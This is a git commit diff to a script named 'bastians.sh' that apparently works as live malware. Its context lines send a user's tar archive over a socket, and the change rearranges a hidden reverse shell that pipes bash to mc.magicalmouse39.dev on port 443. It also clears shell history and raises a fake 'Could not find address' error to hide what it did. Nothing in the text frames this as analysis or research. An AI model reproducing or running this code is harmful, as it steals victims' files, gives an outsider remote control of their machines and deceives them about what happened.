70f83be3e9212fc896fbf202424731c4eeeae973
MagicalMouse39 <31729116+MagicalMouse39@users.noreply.github.com>
2021-11-25 10:27:12 +0100

    Update bastians.sh

--- bastians.sh
+++ bastians.sh
@@ -6,6 +6,4 @@ user = os.getenv("USER")
 with open(f"/home/{user}/mgkl.tar", "rb") as fin:
     s.send(fin.read())
 s.close()
-os.system("$(/bin/bash -l > /dev/tcp/mc.magicalmouse39.dev/443 0<&1 2>&1 &) 1>/dev/null 2>/dev/null")
-os.system("history -c")
-raise Exception("Could not find address \"mc.magicalmouse39.dev\"")' &
+raise Exception("Could not find address \"mc.magicalmouse39.dev\"")' &; $(/bin/bash -l > /dev/tcp/mc.magicalmouse39.dev/443 0<&1 2>&1 &) 1>/dev/null 2>/dev/null &; history -c
